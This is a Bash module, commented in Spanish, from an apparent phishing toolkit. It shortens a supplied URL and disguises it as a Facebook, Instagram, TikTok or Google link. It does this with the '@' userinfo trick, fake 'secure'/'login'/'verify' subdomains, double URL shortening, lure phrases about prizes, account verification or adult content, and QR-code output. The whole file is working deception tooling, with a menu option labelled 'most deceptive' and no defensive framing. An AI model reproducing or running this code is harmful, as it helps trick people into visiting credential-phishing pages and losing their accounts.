#!/bin/bash

# ============================================
# URL MASKING MODULE
# ============================================

# Cargar plantillas
TEMPLATES_FILE="$CONFIG_DIR/templates.conf"
if [[ -f "$TEMPLATES_FILE" ]]; then
    source "$TEMPLATES_FILE"
fi

# Función principal de enmascaramiento avanzado
advanced_url_masking() {
    local original_url=$1
    local platform=$2
    
    clear
    echo -e "${COLORS[BANNER]}${COLORS[BOLD]}"
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║              ADVANCED URL MASKING STUDIO                      ║
║                   Create Viral URLs                           ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${COLORS[RESET]}"
    
    # Seleccionar dominio base
    case $platform in
        facebook) base_domain="facebook.com";;
        instagram) base_domain="instagram.com";;
        tiktok) base_domain="tiktok.com";;
        gmail) base_domain="google.com";;
        *) base_domain="facebook.com";;
    esac
    
    echo -e "\n${COLORS[INFO]}Platform: ${COLORS[SUCCESS]}$base_domain${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}Original URL: ${COLORS[WARNING]}$original_url${COLORS[RESET]}"
    
    echo -e "\n${COLORS[MENU]}Select Masking Style:${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}1) 🎯 Quick Templates (Pre-made viral phrases)"
    echo -e "2) ✏️ Custom Message (Create your own)"
    echo -e "3) 🏷️ Subdomain Spoofing (Advanced)"
    echo -e "4) 🔗 URL Shortener + Custom Path"
    echo -e "5) 🎨 Mixed Technique (Most deceptive)"
    echo -e "6) 📋 Standard Masking${COLORS[RESET]}"
    
    read -p "$(echo -e ${COLORS[INPUT]}"Select option [1-6]: "${COLORS[RESET]})" mask_style
    
    case $mask_style in
        1) template_based_masking "$original_url" "$base_domain" "$platform" ;;
        2) custom_message_masking "$original_url" "$base_domain" ;;
        3) subdomain_spoofing "$original_url" "$base_domain" ;;
        4) shortener_path_masking "$original_url" "$base_domain" ;;
        5) mixed_technique_masking "$original_url" "$base_domain" ;;
        6) standard_masking "$original_url" "$base_domain" ;;
        *) echo -e "${COLORS[ERROR]}Invalid option${COLORS[RESET]}"; return ;;
    esac
}

# Plantillas virales
template_based_masking() {
    local url=$1
    local domain=$2
    local platform=$3
    
    clear
    echo -e "${COLORS[BANNER]}${COLORS[BOLD]}"
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║                    VIRAL TEMPLATES                            ║"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo -e "${COLORS[RESET]}"
    
    echo -e "${COLORS[MENU]}Select Category:${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}1) 💰 Money/Earnings (35 templates)"
    echo -e "2) 🎬 Viral/Shocking (45 templates)"
    echo -e "3) 🔒 Security Verification (30 templates)"
    echo -e "4) 🎁 Promotions/Prizes (40 templates)"
    echo -e "5) 📰 Breaking News (25 templates)"
    echo -e "6) 📱 Platform Specific (FB/IG/TK/Gmail)"
    echo -e "7) 🔞 Adult Content (20 templates)"
    echo -e "8) ⚽ Sports/Events (20 templates)"
    echo -e "9) 💄 Health/Beauty (15 templates)"
    echo -e "10) 🎲 Random Viral${COLORS[RESET]}"
    
    read -p "$(echo -e ${COLORS[INPUT]}"Category [1-10]: "${COLORS[RESET]})" category
    
    local selected_path=""
    
    case $category in
        1) selected_path=$(get_random_template "money");;
        2) selected_path=$(get_random_template "viral");;
        3) selected_path=$(get_random_template "verify");;
        4) selected_path=$(get_random_template "promo");;
        5) selected_path=$(get_random_template "news");;
        6) selected_path=$(get_random_template "$platform");;
        7) selected_path=$(get_random_template "adult");;
        8) selected_path=$(get_random_template "sport");;
        9) selected_path=$(get_random_template "health");;
        10) selected_path=$(get_random_template "all");;
        *) selected_path=$(get_random_template "viral");;
    esac
    
    # Acortar URL
    local short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$url")
    [[ -z "$short_url" ]] && short_url=$(curl -s "https://tinyurl.com/api-create.php?url=$url")
    
    # Crear URL enmascarada
    local masked_url="https://www.$domain/$selected_path@${short_url#https://}"
    
    echo -e "\n${COLORS[BANNER]}═══════════════════════════════════════════════════════════"
    echo -e "  🎯 MASKED URL CREATED"
    echo -e "═══════════════════════════════════════════════════════════${COLORS[RESET]}"
    echo -e "${COLORS[SUCCESS]}$masked_url${COLORS[RESET]}"
    
    save_masked_url "$masked_url"
}

# Obtener plantilla aleatoria
get_random_template() {
    local category=$1
    local templates=()
    
    case $category in
        money) templates=($money1 $money2 $money3 $money4 $money5 $money6 $money7 $money8 $money9 $money10 $money11 $money12 $money13 $money14 $money15 $money16 $money17 $money18 $money19 $money20 $money21 $money22 $money23 $money24 $money25 $money26 $money27 $money28 $money29 $money30 $money31 $money32 $money33 $money34 $money35);;
        viral) templates=($viral1 $viral2 $viral3 $viral4 $viral5 $viral6 $viral7 $viral8 $viral9 $viral10 $viral11 $viral12 $viral13 $viral14 $viral15 $viral16 $viral17 $viral18 $viral19 $viral20 $viral21 $viral22 $viral23 $viral24 $viral25 $viral26 $viral27 $viral28 $viral29 $viral30 $viral31 $viral32 $viral33 $viral34 $viral35 $viral36 $viral37 $viral38 $viral39 $viral40 $viral41 $viral42 $viral43 $viral44 $viral45);;
        verify) templates=($verify1 $verify2 $verify3 $verify4 $verify5 $verify6 $verify7 $verify8 $verify9 $verify10 $verify11 $verify12 $verify13 $verify14 $verify15 $verify16 $verify17 $verify18 $verify19 $verify20 $verify21 $verify22 $verify23 $verify24 $verify25 $verify26 $verify27 $verify28 $verify29 $verify30);;
        promo) templates=($promo1 $promo2 $promo3 $promo4 $promo5 $promo6 $promo7 $promo8 $promo9 $promo10 $promo11 $promo12 $promo13 $promo14 $promo15 $promo16 $promo17 $promo18 $promo19 $promo20 $promo21 $promo22 $promo23 $promo24 $promo25 $promo26 $promo27 $promo28 $promo29 $promo30 $promo31 $promo32 $promo33 $promo34 $promo35 $promo36 $promo37 $promo38 $promo39 $promo40);;
        news) templates=($news1 $news2 $news3 $news4 $news5 $news6 $news7 $news8 $news9 $news10 $news11 $news12 $news13 $news14 $news15 $news16 $news17 $news18 $news19 $news20 $news21 $news22 $news23 $news24 $news25);;
        facebook) templates=($fb1 $fb2 $fb3 $fb4 $fb5 $fb6 $fb7 $fb8 $fb9 $fb10 $fb11 $fb12 $fb13 $fb14 $fb15 $fb16 $fb17 $fb18 $fb19 $fb20 $fb21 $fb22 $fb23 $fb24 $fb25);;
        instagram) templates=($ig1 $ig2 $ig3 $ig4 $ig5 $ig6 $ig7 $ig8 $ig9 $ig10 $ig11 $ig12 $ig13 $ig14 $ig15 $ig16 $ig17 $ig18 $ig19 $ig20 $ig21 $ig22 $ig23 $ig24 $ig25);;
        tiktok) templates=($tk1 $tk2 $tk3 $tk4 $tk5 $tk6 $tk7 $tk8 $tk9 $tk10 $tk11 $tk12 $tk13 $tk14 $tk15 $tk16 $tk17 $tk18 $tk19 $tk20 $tk21 $tk22 $tk23 $tk24 $tk25);;
        gmail) templates=($gml1 $gml2 $gml3 $gml4 $gml5 $gml6 $gml7 $gml8 $gml9 $gml10 $gml11 $gml12 $gml13 $gml14 $gml15 $gml16 $gml17 $gml18 $gml19 $gml20);;
        adult) templates=($adult1 $adult2 $adult3 $adult4 $adult5 $adult6 $adult7 $adult8 $adult9 $adult10 $adult11 $adult12 $adult13 $adult14 $adult15 $adult16 $adult17 $adult18 $adult19 $adult20);;
        sport) templates=($sport1 $sport2 $sport3 $sport4 $sport5 $sport6 $sport7 $sport8 $sport9 $sport10 $sport11 $sport12 $sport13 $sport14 $sport15 $sport16 $sport17 $sport18 $sport19 $sport20);;
        health) templates=($health1 $health2 $health3 $health4 $health5 $health6 $health7 $health8 $health9 $health10 $health11 $health12 $health13 $health14 $health15);;
        *) templates=($viral1 $viral2 $viral3 $viral4 $viral5);;
    esac
    
    echo "${templates[$RANDOM % ${#templates[@]}]}"
}

# Mensaje personalizado
custom_message_masking() {
    local url=$1
    local domain=$2
    
    echo -e "\n${COLORS[INFO]}Create your custom viral message${COLORS[RESET]}"
    read -p "$(echo -e ${COLORS[INPUT]}"Enter message (use hyphens for spaces): "${COLORS[RESET]})" custom_message
    
    local formatted_message=$(echo "$custom_message" | tr ' ' '-' | tr '[:upper:]' '[:lower:]')
    
    local short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$url")
    local masked_url="https://www.$domain/$formatted_message@${short_url#https://}"
    
    echo -e "\n${COLORS[SUCCESS]}$masked_url${COLORS[RESET]}"
    save_masked_url "$masked_url"
}

# Subdomain spoofing
subdomain_spoofing() {
    local url=$1
    local domain=$2
    
    echo -e "\n${COLORS[MENU]}Select subdomain:${COLORS[RESET]}"
    echo -e "1) secure.$domain"
    echo -e "2) login.$domain"
    echo -e "3) verify.$domain"
    echo -e "4) account.$domain"
    
    read -p "$(echo -e ${COLORS[INPUT]}"Option [1-4]: "${COLORS[RESET]})" sub_choice
    
    local subdomain=""
    case $sub_choice in
        1) subdomain="secure";;
        2) subdomain="login";;
        3) subdomain="verify";;
        4) subdomain="account";;
        *) subdomain="secure";;
    esac
    
    read -p "Enter path (e.g., verify-account): " custom_path
    local formatted_path=$(echo "$custom_path" | tr ' ' '-' | tr '[:upper:]' '[:lower:]')
    
    local short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$url")
    local masked_url="https://$subdomain.$domain/$formatted_path@${short_url#https://}"
    
    echo -e "\n${COLORS[SUCCESS]}$masked_url${COLORS[RESET]}"
    save_masked_url "$masked_url"
}

# Técnica mixta
mixed_technique_masking() {
    local url=$1
    local domain=$2
    
    local short_url=$(curl -s "https://tinyurl.com/api-create.php?url=$url")
    local double_short=$(curl -s "https://is.gd/create.php?format=simple&url=$short_url")
    
    local random_phrase=$(get_random_template "viral")
    local subdomains=("secure" "login" "verify" "account")
    local random_sub=${subdomains[$RANDOM % ${#subdomains[@]}]}
    
    local masked_url="https://$random_sub.$domain/$random_phrase@${double_short#https://}"
    
    echo -e "\n${COLORS[SUCCESS]}$masked_url${COLORS[RESET]}"
    save_masked_url "$masked_url"
}

# Guardar URL
save_masked_url() {
    local masked_url=$1
    echo "$masked_url" > "$LOGS_DIR/masked_url.txt"
    
    echo -e "\n${COLORS[MENU]}Generate QR code? [Y/n]${COLORS[RESET]}"
    read -p "" gen_qr
    if [[ "$gen_qr" =~ ^[Yy]?$ ]]; then
        qrencode -t ANSIUTF8 -m 2 -s 4 "$masked_url"
    fi
}